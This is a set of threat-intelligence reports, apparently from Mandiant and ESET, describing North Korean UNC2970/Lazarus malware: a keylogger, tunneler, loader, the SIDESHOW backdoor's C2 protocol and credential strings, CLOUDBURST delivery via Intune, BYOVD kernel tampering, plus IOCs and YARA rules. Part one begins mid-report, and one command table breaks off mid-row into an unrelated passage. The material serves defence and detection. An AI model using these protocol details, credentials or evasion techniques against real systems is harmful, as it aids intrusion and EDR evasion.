TOUCHKEY is a keylogger that captures keystrokes and clipboard data, both of which are encoded with a single-byte XOR and saved to a file. As with TOUCHSHOT, these files need to be acquired by the threat actor through additional means.
 Figure 9: XOR’ing data with byte 0x62 before writing to the staging file
TOUCHKEY creates two files in the C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Templates\ directory. The file name Normal.dost is used for storing the captured keystrokes, while the file name Normal.docb is used for the clipboard data. The full paths are then passed into their own thread, where the keystrokes or clipboard data will be captured and appended to their respective files.
 Figure 10: Path generation for the staging files Figure 11: Adding file names to the full path and creating the threads
In one of the created threads, TOUCHKEY will open the clipboard and grab the data that is stored within it. In the other thread, TOUCHKEY will set a hook into the keyboard, and record any keys that are pressed.
 Figure 12: Capturing the clipboard data Figure 13: Capturing keystrokes
HOOKSHOT
HOOKSHOT is a tunneler that leverages a statically linked implementation of OpenSSL to communicate back to its C2. While it connects over TCP, it does not make use of a client certificate for encryption.
 Figure 14: Example of OpenSSL statically linked in the file
HOOKSHOT takes an encoded argument containing two IP and port pairs, which it will leverage for communicating with its C2.
 Figure 15: Separating IP’s and ports
HOOKSHOT will then create a socket using these two IP addresses, and tunnel traffic across them utilizing TLSv1.0.
 Figure 16: Socket creation
TOUCHMOVE
TOUCHMOVE is a loader that decrypts a configuration file and a payload, both of which must be on disk, and then executes the payload. TOUCHMOVE generates an RC6 key to decrypt the two files by querying the system’s BIOS date, version, manufacturer, and product name. Once decrypted, the results are XOR encoded with a hardcoded key. If the generated RC6 key is incorrect, the configuration and payload files will not successfully decrypt, indicating that UNC2970 compiles instances of TOUCHMOVE after having already conducted reconnaissance on the target victim system. Once the RC6 key is successfully generated, a handle is created to the configuration file, and the decryption process is conducted. If the configuration file is successfully decrypted, the payload’s full path is located within it, and the same decryption process then occurs on the payload. Following this, the payload is executed.
 Figure 17: Bios query strings Figure 18: Creating a handle to the configuration file Figure 19: Creating a handle to the payload
SIDESHOW
SIDESHOW is a backdoor written in C/C++ that communicates via HTTP POST requests with its C2 server. The backdoor is multi-threaded, uses RC6 encryption, and supports at least 49 commands, which can be seen in Table 1. Capabilities include arbitrary command execution (WMI capable); payload execution via process injection; service, registry, scheduled task, and firewall manipulation; querying and updating Domain Controller settings; creating password protected ZIP files; and more. SIDESHOW does not explicitly establish persistence; however, based on the multitude of supported commands it may be commanded to establish persistence.
SIDESHOW derives a system-specific RC6 key using the same registry values as TOUCHMOVE and uses the generated key to decrypt the same configuration file from disk that TOUCHMOVE decrypted. The decrypted configuration file contains a list of C2 URLs to which SIDESHOW communicates using HTTP POST requests. SIDESHOW iterates this C2 URL list and attempts to authenticate to each C2 URL until it is successful. Once successful, SIDESHOW enters a state of command processing and sends additional HTTP POST requests to retrieve commands. SIDESHOW attempts to use the system's default HTTP User-Agent string during C2 communications; however, if not available it uses the hard-coded HTTP User-Agent string:
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69
When communicating to its C2 server via HTTP POST requests, SIDESHOW forms a URI parameter string consisting of a mix of randomly selected and hard-coded URI parameters.
Authentication requests use the following URI parameter string format:
1=&=pAJ9dk4OVq85jxKWoNfw1AG2C&=<16_random_hex_chars>
The first URI parameter value comes from SIDESHOW’s configuration and is used to seed the random function.
The second URI parameter value, pAJ9dk4OVq85jxKWoNfw1AG2C, is hardcoded and likely an authentication credential.
The third URI parameter value, <16_random_hex_chars>, is a session identifier () used for future communications and consists of two subcomponents:
1.	<8_random_hex_based_on_seed>
2.	<8_random_hex_based_on_tickcount>
The first URI parameter's value, , is used as a random seed value to derive the first eight hexadecimal characters (<8_random_hex_based_on_seed>), whereas the last eight hexadecimal characters (<8_random_hex_based_on_tickcount>) are derived using the CPU's current tick count as the random seed value. This results in the value <8_random_hex_based_on_seed> being deterministic, while <8_random_hex_based_on_tickcount> is pseudo-random.
The following is an example authentication URI parameter string:
 
1pguid=A59&ssln=pAJ9dk4OVq85jxKWoNfw1AG2C&cup2key=184B280E341AE63F
 Figure 20: Building of URI parameter string
SIDESHOW parses the response and considers it a successful authentication if it contains the string .
Command requests use the following URI parameter string format (notice that the  and  have switched locations in the string).
1=<5_random_digits>&=2&=<6_random_digits>
Example command URI parameter string:
1other=37685&session=2184B280E341AE63F&page=593881
SIDESHOW parses the command response body and extracts data following the string . SIDESHOW then appears to Base64 decode and RC6 decrypt the extracted data. SIDESHOW responds to the commands listed in Table 1 (commands are described on a best effort basis).
 Figure 21: Switch statement following parsing of command
Table 1: Commands supported by SIDESHOW
Command ID	Description
00	Get lightweight system information and a few configuration details
01	Enumerate drives and list free space
02	List files in directory
03	Execute arbitrary command via CreateProccess() and return output
04	Likely zip directory to create password protected ZIP file with password AtbsxjCiD2axc*ic[3
The malicious PowerShell script was used to decode the Base64 encoded CLOUDBURST payload and drop it on disk as C:\ProgramData\mscoree.dll. The script would then write a copy of C:\Windows\System32\PresentationHost.exe to C:\ProgramData and execute it with the argument -embeddingObject. PresentationHost.exe is a legitimate Windows binary used by UNC2970 to sideload CLOUDBURST.
Upon execution, PresentationHost.exe would load the CLOUDBURST payload into memory. Upon further analysis of the Microsoft IME endpoint logs, Mandiant identified a unique GUID, f391eded-82d3-4506-8bf4-9213f6f4d586, in the PolicyID field, which is a "Unique identifier of the Policy in the data warehouse". The Intune Data Warehouse provides insight and information about an enterprise mobile environment, such as historical Intune data and Intune data refreshed on a daily occurence. The identified GUID also matched the GUID of the PowerShell script file name and the GUID observed in an IME associated registry key.
When reviewing the Intune Tenant admin Audit logs, Mandiant identified the same GUID under the ObjectID field. The Intune Tenant audit logs shows records of activities that generate a change in Intune, including create, update (edit), delete, assign, and remote actions. The logs revealed that the threat actors used a previously compromised account to perform a create, assign, patch, and finally a delete action of a Device Management Script, using the Target Microsoft.Management.Services.Api.DeviceManagementScript and the GroupID f391eded-82d3-4506-8bf4-9213f6f4d586.
Further analysis revealed that ObjectID GUIDs referenced in the Intune Tenant admin Audit logs maps to the ID of Mobile App assignment groups.
At the time of analysis, the GroupID f391eded-82d3-4506-8bf4-9213f6f4d586, was no longer present in the Intune Endpoint management admin center, and was likely deleted by the threat actors.
In order to determine malicious usage of Microsoft Intune, Mandiant performed the following analysis steps:
1.	Analyzed AzureAD sign-in logs for evidence of suspicious logons to the Microsoft Intune application
o	Analyzed Microsoft Intune audit logs for evidence of unexpected deployments and performed the following:
	Utilized the GroupID GUID to search for the presence of the following endpoint artifacts:
1.	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\IntuneManagementExtension\Policies\\
2.	C:\Program Files (x86)\Microsoft Intune Management Extension\Policies\Scripts\_.ps1
2.	For hosts that had the aforementioned artifacts, the following was performed:
o	Acquired the PS1 file(s) and analyzed for malicious code
o	Performed traditional endpoint analysis
Mandiant tracks the malware being distributed via InTune as CLOUDBURST. CLOUDBURST is a downloader written in C that communicates via HTTP. The malware attempts to make itself look like a legitimate version of mscoree.dll, but contains fake exports, the same way that TOUCHSHIFT uses fake exports. One variant of CLOUDBURST made use of legitimate open-source software that was added as exports, in addition to the fake exports. The actual export with malicious code is CorExitProcess. The CorExitProcess export expects the single argument -embeddingObject.
 Figure 22: Comparing command line argument with -embeddingObject
Once the aforementioned command line argument has been verified, CLOUDBURST builds the domain as a stack string, and sends out the two following requests to the C2 server:
hxxps://[c2domain]/wp-content/plugins/contact.php?gametype=&type=O8Akm8aV09Nw412KMoWJd
hxxps://[c2domain]/wp-content/plugins/contact.php?gametype=tennis&type=k
Following the network connections, CLOUDBURST conducts a host survey, in which it will determine the Product Name, Computer Name, and enumerate running processes.
 Figure 23: Calling functions to enumerate the host
Upon completion of the host enumeration, CLOUDBURST then downloads and executes shellcode from the C2 server. At this time, Mandiant was unable to recover and identify the purpose of the shellcode downloaded by CLOUDBURST.
 Figure 24: Allocating and populating memory space, and executing the shellcode
Outlook and Implications
The identified malware tools highlight continued malware development and deployment of new tools by UNC2970. Although the group has previously targeted defense, media, and technology industries, the targeting of security researchers suggests a shift in strategy or an expansion of its operations. Technical indicators and the group’s TTPs link it to TEMP.Hermit, although this latest activity suggests the group is adapting their capabilities as more of their targets move to cloud services. To learn more about how UNC2970 further enabled its operations, please see part two of our research.
Campaign Tracking
Mandiant will continue to monitor UNC2970’s campaigns and intrusion operations and will provide notable and dynamic updates regarding changes in tactics and techniques, the introduction of tools with new capabilities, or the use of new infrastructure to carry out their mission.
For more insights into how Mandiant tracks this and similar campaigns, see our Threat Campaigns feature within Mandiant Advantage Threat Intelligence.
Recommended Mitigations
Hardening Azure AD and Microsoft Intune
Mandiant has observed UNC2970 leverage weak identity controls in Azure AD combined with Microsoft Intune’s endpoint management capabilities to effectively deploy malicious PowerShell scripts onto unsuspecting endpoints.
Increasing Azure AD identity protections and limiting access to Microsoft Intune is essential in mitigating the attacker activity observed by Mandiant. Organizations should consider implementing the following hardening controls:
Cloud-Only Accounts: Organizations should utilize cloud-only accounts for privileged access within Azure AD (e.g., Global Admins, Intune Administrator) and never assign privileged access to synced accounts from on-premises identity providers such as Active Directory. Additionally, admins should utilize a separate “daily-driver” account for day-to-day activities such as sending email or web-browsing. Dedicated admin accounts should be utilized to carry out administrative functions only.
Enforce Strong Multi-Factor Authentication Methods: Organizations should consider enforcing enhanced and phishing-resistant Multi-Factor Authentication (MFA) methods for all users and administrators. Weak MFA methods commonly include SMS, Voice (phone call), OTPs, or Push notifications and should be considered for removal. MFA enhancements for non-privileged users should include contextual information regarding the MFA request such as number-matching, application name, and geographic location. For privileged accounts, Mandiant recommends the enforcement of hardware tokens or FIDO2 Security Keys as-well as requiring MFA per each sign-in regardless of location (e.g., Trusted Network, Corporate VPN). As an initial roll out for enhanced MFA methods, organizations should focus on all accounts with administrative privileges in Azure AD. Microsoft has additional information regarding contextual MFA settings.
Privileged Identity Management (PIM) Solution: Mandiant recommends that organizations consider utilizing a PIM solution. A PIM solution should include a Just-In-Time (JIT) access capability which will provide access when requested, for a specific duration of time, and should initiate an approval flow, prior to providing an account access to a highly privileged role (e.g., Global Administrator or Intune Administrator).
Conditional Access Policies (CAPs) to Enforce Security Restrictions in Azure AD: A CAP allows organizations to set requirements for accessing cloud apps such as Intune, based on various conditions including location and device platform. Mandiant recommends that Organizations utilize CAPs to restrict Azure administrative functions to only compliant and registered devices in Azure AD and only from a specific subset of trusted IPs or ranges. Microsoft has more information on leveraging CAPs to access Cloud Apps.
Azure Identity Protection: Azure Identity Protection is a security feature within Azure Active Directory that allows organizations to automate the detection and remediation of identity-based risks. Identity Protection analyzes user account activity as-well as sign-in activity to identify potentially compromised accounts or unauthorized authentication requests. Identity Protection data can be leveraged to enhance Conditional Access Policies by enforcing access controls based on user or sign-in risk. Additionally, Identity Protection risk data should be exported to a Security Information and Event Management (SIEM) solution for further correlation and analysis. Note: Azure Identity Protection requires an Azure AD Premium P2 License.
Multi Admin Approval with Intune: To prevent unauthorized changes, organizations utilizing Intune should implement the Multi Admin Approval feature. This feature enforces a multiple administrative approval process that requires secondary admin approval before modifying or creating Script and App deployments. Note: As of February 2023, Multi Admin Approval is in Public Preview and does not yet support request notifications. Requests will need to be manually communicated to expedite the approval workflow. Microsoft has more information regarding Multi Admin Approval.
Additional Security Controls
Block Office Macros: While Microsoft has changed the default behavior of Office applications to block macros from the internet, Mandiant still recommends Organizations proactively deploy policies to control and enforce the behavior of office files containing macros. Microsoft has more information on using policies to manage how Office handles macros.
Disable Disk Image Auto-Mount: Mandiant has observed UNC2970 utilize trojanized ISO files containing malicious payloads to bypass security controls and trick victims into executing malware. On Windows systems, the option to mount an ISO by “right-clicking” the file then selecting “Mount” from the context menu can be removed by deleting the registry keys associated with image file types (.iso, .img, .vhd, .vhdx). Deleting these registry keys will also prevent a user from auto-mounting an image file by “double-clicking” the file.
Enhance PowerShell Logging: Increase PowerShell logging to provide security engineers and investigators the visibility needed to detect malicious activity and provide a historical record of how PowerShell was used on systems. For additional details regarding enhancing PowerShell logging, please reference to the Mandiant blog post, “Greater Visibility Through PowerShell Logging”.
Indicators of Compromise
IOC	Signature
e97b13b7e91edeceeac876c3869cc4eb	PLANKWALK
a9e30c16df400c3f24fc4e9d76db78ef	PLANKWALK
f910ffb063abe31e87982bad68fd0d87	PLANKWALK
30358639af2ecc217bbc26008c5640a7	LIDSHIFT
41dcd8db4371574453561251701107bc	LIDSHOT
866f9f205fa1d47af27173b5eb464363	TOUCHSHIFT
8c597659ede15d97914cb27512a55fc7	TOUCHSHIFT
a2109276dc704dedf481a4f6c8914c6e	TOUCHSHIFT
3bf748baecfc24def6c0393bc2354771	TOUCHSHOT
91b6d6efa5840d6c1f10a72c66e925ce	TOUCHKEY
300103aff7ab676a41e47ec3d615ba3f	HOOKSHOT
49425d6dedb5f88bddc053cc8fd5f0f4	TOUCHMOVE
abd91676a814f4b50ec357ca1584567e	SIDESHOW
05b6f459be513bf6120e9b2b85f6c844	CLOUDBURST
hxxp://webinternal.anyplex[.]com/images/query_image.jsp	PLANKWALK C2
hxxp://www.fainstec[.]com/assets/js/jquery/jquery.php	PLANKWALK C2
hxxps://ajayjangid[.]in/js/jquery/jquery.php	PLANKWALK C2
hxxps://sede.lamarinadevalencia[.]com/tablonEdictal/layout/contentLayout.jsp	PLANKWALK C2
hxxps://leadsblue[.]com/wp-content/wp-utility/index.php	LIDSHOT C2
hxxps://toptradenews[.]com/wp-content/themes/themes.php	SIDESHOW C2
hxxp://mantis.quick.net[.]pl/library/securimage/index.php	SIDESHOW C2
hxxp://www.keewoom.co[.]kr/prod_img/201409/prod.php	SIDESHOW C2
hxxp://abba-servicios[.]mx/wordpress/wp-content/themes/config.php	SIDESHOW C2
hxxp://www.ruscheltelefonia[.]com.br/public/php/index.php	SIDESHOW C2
hxxps://olidhealth[.]com/wp-includes/php-compat/compat.php	CLOUDBURST C2
hxxps://doug[.]org/wp-includes/admin.php	CLOUDBURST C2
hxxps://crickethighlights[.]today/wp-content/plugins/contact.php	CLOUDBURST C2
Mandiant Security Validation Actions
Organizations can validate their security controls using the following actions with Mandiant Security Validation.
VID	Name
A105-491	Command and Control - QUESTDOWN, Exfiltration, Variant #1
A105-492	Command and Control - QUESTDOWN, Exfiltration, Variant #2
A105-493	Command and Control - QUESTDOWN, Next Stage Download Attempt, Variant #1
A105-494	Command and Control - QUESTDOWN, Status, Variant #1
A105-507	Phishing Email - Malicious Attachment, PLANKWALK Downloader, Variant #1
A105-508	Phishing Email - Malicious Attachment, QUESTDOWN Dropper, Variant #1
A105-514	Protected Theater - QUESTDOWN, Execution, Variant #1
S100-218	Malicious Activity Scenario - Campaign 22-046, QUESTDOWN Infection
Signatures
PLANKWALK
rule M_Hunt_APT_PLANKWALK_Code_String {
  meta:
    author = "Mandiant"
    description = "Detects a format string containing code and token found in PLANKWALK"
  strings:
     $hex = { 63 6F 64 65 [1-6] 3D 25 64 26 [1-6] 75 73 65 72 [1-6] 3D 25 73 26 [1-6] 74 6F 6B 65   }
  condition:
    (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and $hex
}
LIDSHIFT
rule M_APT_Loader_Win_LIDSHIFT_1 {
   meta:
      author = "Mandiant"
      description = "Detects LIDSHIFT implant"
    strings:
      $anchor1 = "%s:%s:%s" ascii
      $encloop = { 83 ?? 3F 72 ?? EB ?? 8D ?? ??  B8 ?? 41 10 04 F7 ?? 8B ??  2B ??  D1 ??  03 ??  C1 ?? 05 6B ?? 3F 2B ??  42 0F ?? ?? ?? 41 ?? ?? }                   
    condition:
                  uint16(0) == 0x5a4d and all of them
}
LIDSHOT
rule M_APT_Loader_Win_LIDSHOT_1 {
    meta:
        author = "Mandiant"
        description = "Detects LIDSHOT implant"
    strings:
        $code1 = { 4C 89 6D ?? 4C 89 6D ?? C7 45 ?? 01 23 45 67 C7 45 ?? 89 AB CD EF C7 45 ?? FE DC BA 98 C7 45 ?? 76 54 32 10 4C 89 6C 24 ?? 48 C7 45 ?? 0F 00 00 00 C6 44 24 ?? 00 }
        $code2 = { B8 1F 85 EB 51 41 F7 E8 C1 FA 03 8B CA C1 E9 1F 03 D1 6B CA 19 }
        $code3 = { C7 45 ?? 30 6B 4C 6C 66 C7 45 ?? 55 00 }                    
      condition:
   uint16(0) == 0x5a4d and all of them
}
CLOUDBURST
rule M_APT_Loader_Win_CLOUDBURST_1 {
    meta:
        author = "Mandiant"
      strings:    
$anchor1 = "Microsoft Enhanced Cryptographic Provider v1.0" ascii wide
$code1 = { 74 79 70  }
$code2 = { 65 71 75 69 }
$code3 = { 62 6F 78 69 }
$code4 = { E8 ?? ?? ?? ?? FF C6 B8 99 99 99 99 F7 EE D1 FA 8B C2   C1 E8 1F 03 D0  8D 04 16  8D 34 90  85 F6 75 ?? }
$str1 = "%s%X"   
      condition:
                  uint16(0) == 0x5a4d and all of them
}
TOUCHSHIFT
rule M_DropperMemonly_TOUCHSHIFT_1 {
    meta:
        author = "Mandiant"
        description = "Hunting rule for TOUCHSHIFT"
    strings:
        $p00_0 = {0943??eb??ff43??b0??eb??e8[4]c700[4]e8[4]32c0}
        $p00_1 = {4c6305[4]ba[4]4c8b0d[4]488b0d[4]ff15[4]4c6305[4]ba[4]4c8b0d[4]488b0d}
    condition:
        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and
        (
            ($p00_0 in (70000..90000) and $p00_1 in (0..64000))
        )
}
SIDESHOW
rule M_APT_Backdoor_Win_SIDESHOW_1 {
    meta:
        author = "Mandiant"
            description = "Detects string deobfuscation function in SIDESHOW, may also detect other variants of malware from the same actor"
      strings:
            $code1 = { 41 0F B6 ?? 33 ?? 48 ?? ?? 0F 1F 80 00 00 00 00 3A ?? 74 ?? FF ?? 48 FF ?? 83 ?? 48 72 ?? EB ?? 41 0F ?? ?? 2B ?? ?? 39 8E E3 38 83 ?? 48 F7 ?? C1 ?? 04 8D ?? ?? C1 ?? 03 2B ?? ?? 39 8E E3 38 }
      condition:
                  uint16(0) == 0x5a4d and (all of them)
}
TOUCHKEY
rule M_Hunting_TOUCHKEY {
    meta:
        author = "Mandiant"
        description = "Hunting rule For TOUCHKEY"
    strings:
        $a1 = "Normal.dost" 
        $a2 = "Normal.docb"
        $c1 = "[SELECT]" ascii wide
        $c2 = "[SLEEP]" ascii wide
        $c3 = "[LSHIFT]" ascii wide
        $c4 = "[RSHIFT]" ascii wide
        $c5 = "[ENTER]" ascii wide
        $c6 = "[SPACE]" ascii wide
    condition:
        (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550
        and filesize < 200KB and (5 of ($c*)) and $a1 and $a2
}
TOUCHSHOT
rule M_Hunting_TOUCHSHOT {
     meta:
        author = "Mandiant"
        description = "Hunting rule For TOUCHSHOT"
    strings:
        $path = "%s\\Microsoft\\Windows\\Themes\\" wide
        $format = "%04d%02d%02d-%02d%02d%02d"
        $s1 = "EnumDisplaySettingsExW" ascii
        $s2 = "GetSystemMetrics" ascii
        $s3 = "GetDC" ascii
        $s5 = "ReleaseDC" ascii
    condition:
        (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550
        and filesize < 200KB and (3 of ($s*)) and $path and $format
}
HOOKSHOT
rule M_Hunting_HOOKSHOT {
    meta:
        author = "Mandiant"
        description = "Hunting rule for HOOKSHOT"
    strings:
        $p00_0 = {8bb1[4]408873??85f675??488b81[4]488b88[4]4885c974??e8}
        $p00_1 = {8bf3488bea85db0f84[4]4c8d2d[4]66904c8d4424??8bd6488bcd}
    condition:
        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and
        (
            ($p00_0 in (470000..490000) and $p00_1 in (360000..380000))
        )
}

 
Stealing the LIGHTSHOW (Part Two) — LIGHTSHIFT and LIGHTSHOW
MANDIANT INTELLIGENCE AND CONSULTING
MAR 09, 2023
7 MIN READ
THREAT INTELLIGENCE
CONSULTING
UNCATEGORIZED GROUPS (UNC GROUPS)
NORTH KOREA
MALWARE
In part one on North Korea's UNC2970, we covered UNC2970’s tactics, techniques and procedures (TTPs) and tooling that they used over the course of multiple intrusions. In this installment, we will focus on how UNC2970 utilized Bring Your Own Vulnerable Device (BYOVD) to further enable their operations.
During our investigation, Mandiant consultants identified most of the original compromised hosts, targeted by UNC2970, contained the files %temp%\_SB_SMBUS_SDK.dll and suspicious drivers, created around the same time on disk.
At the time Mandiant initially identified these files, we were unable to determine how they were dropped or the exact use for these files. It wasn't until later in the investigation, during analysis of a forensic image, where the pieces started falling into place. A consultant noticed multiple keyword references to the file C:\ProgramData\USOShared\Share.DAT (MD5: def6f91614cb47888f03658b28a1bda6). Upon initial glance at the Forensic Image, this file was no longer on disk. However, Mandiant was able to recover the original file, and the initial analysis of the sample found that Share.DAT was a XORed data blob, which was encoded with the XOR key 0x59.
The decoded payload (MD5: 9176f177bd88686c6beb29d8bb05f20c), referred to by Mandiant as LIGHTSHIFT, is an in-memory only dropper. The LIGHTSHIFT dropper distributes a payload (MD5: ad452d161782290ad5004b2c9497074f) that Mandiant refers to as LIGHTSHOW. Once loaded into memory, LIGHTSHIFT invokes the exports Create then Close in that order. The response from Close is written as a hex formatted address to the file C:\Windows\windows.ini.
 Figure 1: LIGHTSHIFT preparing to load LIGHTSHOW
LIGHTSHOW is a utility that makes use of two primary anti-analysis techniques used to hinder both dynamic and static analysis. To deter static analysis, LIGHTSHOW was observed being packed by VM-Protect. In an effort to thwart dynamic analysis, LIGHTSHOW is targeted to a specific host and requires a specific SHA256 hash corresponding to a specific computer name or the sample will not fully execute. Once FLARE completed the analysis of LIGHTSHOW, we were able to understand how the files %temp%\_SB_SMBUS_SDK.dll and drivers were created on disk.
LIGHTSHOW is a utility that was used by UNC2970 to manipulate kernel data-structures and represents an advancement in DPRK’s capabilities to evade detection. To accomplish this, LIGHTSHOW drops a legitimate version of a driver with known vulnerabilities, with a SHA256 hash of 175eed7a4c6de9c3156c7ae16ae85c554959ec350f1c8aaa6dfe8c7e99de3347 to C:\Windows\System32\Drivers with one of the following names chosen at random and appended with mgr:
•	circlass
•	dmvsc
•	hidir
•	isapnp
•	umpass
LIGHTSHOW then creates the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ where  is the same as the chosen filename without appended mgr. It then creates a registry key with the value name ImagePath, which points to the path of the driver. The sample then loads the driver using NtLoadDriver. LIGHTSHOW drops and loads a dummy DLL %temp%\_SB_SMBUS_SDK.dll to register itself to the driver as a legitimate caller.
Using the vulnerable driver, LIGHTSHOW can perform arbitrary read and write operations to kernel memory. LIGHTSHOW uses this read/write primitive to patch different kernel routines, which are related to the type of facilities an Endpoint Detection and Response (EDR) software may use, to enable evasion of said EDR software. After the read and write operations to kernel memory, the sample unloads and deletes %temp%\_SB_SMBUS_SDK.dll.
Examining the chain of execution, we see further obfuscation techniques being employed in LIGHTSHOW. UNC2970 has a concerted effort towards obfuscation and employs multiple methods to do this throughout the entire chain of delivery and execution.
 Figure 2: LIGHTSHOW Obfuscation
LIGHTSHOW is another example of tooling that looks to capitalize on the technique of BYOVD. BYOVD is a technique that utilizes the abuse of legitimate and trusted, but vulnerable drivers, to bypass kernel level protections. This technique has been utilized by adversaries ranging from financial actors, such as UNC3944, to espionage actors like UNC2970, which shows its usefulness during intrusion operations. AHNLab recently released a report on activity tracked as Lazarus Group that focused largely on the use of BYOVD. While Mandiant did not observe the hashes included in the AHNLab report, the use of SB_SMBUS_SDK.dll as well as other similarities, such as the exported functions Create and Close, indicate an overlap between the activity detailed in this blog post and those detailed by AHNLab.
Throughout several incidents we responded to in 2022 that involved UNC2970, we observed them utilizing a small set of vulnerable drivers. This includes the Dell DBUtil 2.3 and the ENE Technology device drivers. UNC2970 utilized both of these drivers in an attempt to evade detection. These two drivers, and many more, are found in the Kernel Driver Utility (KDU) toolkit. With this in mind, it is likely that we will continue to see UNC2970 abuse vulnerable drivers from other vendors.
Mandiant has worked to detect and mitigate BYOVD techniques for a number of years and has worked closely with industry allies to report vulnerabilities when discovered. During research being carried out on UNC2970 we discovered a vulnerable driver that the actor had access to, but did not know was vulnerable - essentially making it a 0day in the wild but not being actively exploited. This was verified through our Offensive Task Force who subsequently carried out a notification to the affected organization and reported the vulnerability to MITRE, which was assigned CVE-2022-42455.
Outlook and Implications
Mandiant continues to observe multiple threat actors utilizing BYOVD during intrusion operations. Because this TTP provides adversaries an effective means to bypass and mitigate EDR, we assess that it will continue to be utilized and adapted into actor tooling. The continued targeting of security researchers by UNC2970 also provides an interesting way that the group can potentially continue to expand their toolset to gain an upper hand with BYOVD.
Mitigations
Because attestation signing is a legitimate Microsoft program and the resulting drivers are signed with Microsoft certificates, execution-time detection is made much more difficult as most EDR tools and Anti-Viruses will allow binaries signed with Microsoft certificates to load. The recent blog post released by Mandiant on UNC3944 driver operations details multiple techniques that can be used by organizations to hunt for the abuse of attestation signing. If you haven't already, don't forget to read part one on North Korea's UNC2970. Additionally, Microsoft recently released a report detailing how organizations can harden their environment against potentially vulnerable third-party developed drivers.
Indicators of Compromise
MD5	Signature
def6f91614cb47888f03658b28a1bda6	XOR’d LIGHTSHIFT
9176f177bd88686c6beb29d8bb05f20c	LIGHTSHIFT
ad452d161782290ad5004b2c9497074f	LIGHTSHOW
7e6e2ed880c7ab115fca68136051f9ce	ENE Driver
SB_SMBUS_SDK.dll	LIGHTSHOW Dummy DLL
C:\Windows\windows.ini	LIGHTSHIFT Output
Signatures
LIGHTSHIFT
rule M_Code_LIGHTSHIFT
{
    meta:
        author = "Mandiant"
        description = "Hunting rule for LIGHTSHIFT"
       sha256 = "ce501fd5c96223fb17d3fed0da310ea121ad83c463849059418639d211933aa4"
    strings:
        $p00_0 = {488b7c24??448d40??48037c24??488bcfff15[4]817c24[5]74??488b4b??33d2}
        $p00_1 = {498d7c01??8b47??85c075??496345??85c07e??8b0f41b9}
    condition:
        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and
        (
            ($p00_0 in (750..11000) and $p00_1 in (0..8200))
        )
}
LIGHTSHOW
rule M_Code_LIGHTSHOW
{
    meta:
        author = "Mandiant"
        description = "Hunting rule For LIGHTSHOW."
        md5 = "ee5057da3e38b934dae15644c6eb24507fb5a187630c75725075b24a70065452"
    strings:
            $E01 = { 46 75 64 4d 6f 64 75 6c 65 2e 64 6c 6c }
            $I01 = { 62 63 72 79 70 74 2e 64 6c 6c }
            $I02 = { 4b 45 52 4e 45 4c 33 32 2e 64 6c 6c }
            $I03 = { 75 73 65 72 33 32 2e 64 6c 6c 00 }
        $H1 =  { 4D 5A 90 00 }
        $H2 =  { 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F }
            $F01 = { 47 65 74 4d 6f 64 75 6c 65 46 69 6c 65 4e 61 6d 65 57 }
            $F02 = { 47 65 74 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 }
            $F03 = { 47 65 74 46 69 6c 65 54 79 70 65 }
            $F04 = { 47 65 74 56 65 72 73 69 6f 6e }
            $F05 = { 51 75 65 72 79 53 65 72 76 69 63 65 53 74 61 74 75 73 }
            $F06 = { 42 43 72 79 70 74 4f 70 65 6e 41 6c 67 6f 72 69 74 68 6d 50 72 6f 76 69 64 65 72 }
            $M01 = { 68 2d 79 6e b1 }
            $M02 = { 68 ea 71 c2 55 }
            $M03 = { 66 b8 ad eb }
            $M04 = { 4c 8d 2c 6d b3 6c 05 39 }
            $M05 = { 48 8d 2c 95 08 9d ec 9a }
            $S01 = { 48 8d 0c f5 a3 cd 0a eb}
            $S02 = { 81 f9 7f 56 e6 0a}
    condition:
        ($H1 in (0..2048)) and ($H2 in (0..2048)) and filesize < 100MB and filesize > 5KB and all of ($M0*) and all of ($E*) and all of ($I0*) and 6 of ($F0*) and all of ($S0*)
}

 
WinorDLL64: A backdoor from the vast Lazarus arsenal?
The targeted region, and overlap in behavior and code, suggest the tool is used by the infamous North Korea-aligned APT group
 
Vladislav Hrčka
23 Feb 2023  •  10 min. read
 
ESET researchers have discovered one of the payloads of the Wslink downloader that we uncovered back in 2021. We named this payload WinorDLL64 based on its filename WinorDLL64.dll. Wslink, which had the filename WinorLoaderDLL64.dll, is a loader for Windows binaries that, unlike other such loaders, runs as a server and executes received modules in memory. As the wording suggests, a loader serves as a tool to load a payload, or the actual malware, onto the already compromised system. The initial Wslink compromise vector has not been identified.
The initially unknown Wslink payload was uploaded to VirusTotal from South Korea shortly after the publication of our blogpost, and hit one of our YARA rules based on Wslink’s unique name WinorDLL64. Regarding Wslink, ESET telemetry has seen only a few detections - in Central Europe, North America, and the Middle East.
The WinorDLL64 payload serves as a backdoor that most notably acquires extensive system information, provides means for file manipulation, such as exfiltrating, overwriting, and removing files, and executes additional commands. Interestingly, it communicates over a connection that was already established by the Wslink loader.
In 2021, we did not find any data that would suggest Wslink is a tool from a known threat actor. However, after an extensive analysis of the payload, we have attributed WinorDLL64 to the Lazarus APT group with low confidence based on the targeted region and an overlap in both behavior and code with known Lazarus samples.
Active since at least 2009, this infamous North-Korea aligned group is responsible for high-profile incidents such as both the Sony Pictures Entertainment hack and tens-of-millions-of-dollar cyberheists in 2016, the WannaCryptor (aka WannaCry) outbreak in 2017, and a long history of disruptive attacks against South Korean public and critical infrastructure since at least 2011. US-CERT and the FBI call this group HIDDEN COBRA.
Based on our extensive knowledge of the activities and operations of this group, we believe that Lazarus consists of a large team that is systematically organized, well prepared, and is made up of several subgroups that utilize a large toolset. Last year, we discovered a Lazarus tool that took advantage of the CVE 2021 21551 vulnerability to target an employee of an aerospace company in the Netherlands, and a political journalist in Belgium. It was the first recorded abuse of the vulnerability; in combination, the tool and the vulnerability led to the blinding of the monitoring of all security solutions on compromised machines. We also provided an extensive description of the structure of the virtual machine used in samples of Wslink.
